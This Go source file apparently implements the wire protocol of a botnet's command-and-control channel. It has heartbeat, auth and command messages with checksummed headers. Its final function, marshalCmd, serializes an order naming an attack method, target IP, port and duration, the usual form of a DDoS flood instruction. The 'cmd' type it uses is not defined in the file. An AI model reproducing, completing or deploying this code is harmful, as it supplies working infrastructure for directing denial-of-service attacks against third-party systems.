package main

import (
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

const (
	msgPing     = 0x01
	msgPong     = 0x02
	msgCmd      = 0x03
	msgDiag     = 0x04
	msgHeart    = 0x05
	msgAuth     = 0x06
	msgAuthOK   = 0x07
)

type wireHdr struct {
	Type   uint8
	Len    uint32
	Stamp  int64
	Chksum uint16
}

type wireMsg struct {
	Hdr  wireHdr
	Data []byte
}

func crc16(data []byte) uint16 {
	h := sha256.Sum256(data)
	return binary.BigEndian.Uint16(h[:2])
}

func newMsg(typ uint8, payload []byte) wireMsg {
	ts := time.Now().UnixNano()
	w := wireMsg{
		Hdr:  wireHdr{Type: typ, Len: uint32(len(payload)), Stamp: ts},
		Data: payload,
	}
	tmp := make([]byte, 19+w.Hdr.Len)
	tmp[0] = w.Hdr.Type
	binary.BigEndian.PutUint32(tmp[1:5], w.Hdr.Len)
	binary.BigEndian.PutUint64(tmp[5:13], uint64(w.Hdr.Stamp))
	copy(tmp[19:], w.Data)
	w.Hdr.Chksum = crc16(append(tmp[0:17], tmp[19:]...))
	return w
}

func encodeMsg(w wireMsg) ([]byte, error) {
	buf := make([]byte, 19+w.Hdr.Len)
	buf[0] = w.Hdr.Type
	binary.BigEndian.PutUint32(buf[1:5], w.Hdr.Len)
	binary.BigEndian.PutUint64(buf[5:13], uint64(w.Hdr.Stamp))
	binary.BigEndian.PutUint16(buf[17:19], w.Hdr.Chksum)
	copy(buf[19:], w.Data)
	return buf, nil
}

func decodeMsg(data []byte) (wireMsg, error) {
	if len(data) < 19 {
		return wireMsg{}, fmt.Errorf("pkt too small")
	}
	var w wireMsg
	w.Hdr.Type = data[0]
	w.Hdr.Len = binary.BigEndian.Uint32(data[1:5])
	w.Hdr.Stamp = int64(binary.BigEndian.Uint64(data[5:13]))
	w.Hdr.Chksum = binary.BigEndian.Uint16(data[17:19])
	if len(data) < int(19+w.Hdr.Len) {
		return wireMsg{}, fmt.Errorf("incomplete pkt")
	}
	w.Data = make([]byte, w.Hdr.Len)
	copy(w.Data, data[19:19+w.Hdr.Len])
	want := crc16(append(data[0:17], data[19:19+w.Hdr.Len]...))
	if want != w.Hdr.Chksum {
		return wireMsg{}, fmt.Errorf("checksum mismatch")
	}
	return w, nil
}

func sendMsg(c net.Conn, w wireMsg) error {
	raw, err := encodeMsg(w)
	if err != nil {
		return err
	}
	_, err = c.Write(raw)
	return err
}

func recvMsg(c net.Conn) (wireMsg, error) {
	c.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer c.SetReadDeadline(time.Time{})
	hdr := make([]byte, 19)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return wireMsg{}, err
	}
	pLen := binary.BigEndian.Uint32(hdr[1:5])
	if pLen > 16*1024 {
		return wireMsg{}, fmt.Errorf("pkt too large: %d", pLen)
	}
	body := make([]byte, pLen)
	if pLen > 0 {
		if _, err := io.ReadFull(c, body); err != nil {
			return wireMsg{}, err
		}
	}
	return decodeMsg(append(hdr, body...))
}

func marshalCmd(c cmd) []byte {
	buf := make([]byte, 42)
	copy(buf[0:16], c.Method[:])
	copy(buf[16:20], c.TargetIP[:])
	binary.BigEndian.PutUint16(buf[20:22], c.Port)
	binary.BigEndian.PutUint32(buf[22:26], c.Duration)
	copy(buf[26:42], c.Pad[:])
	return buf
}
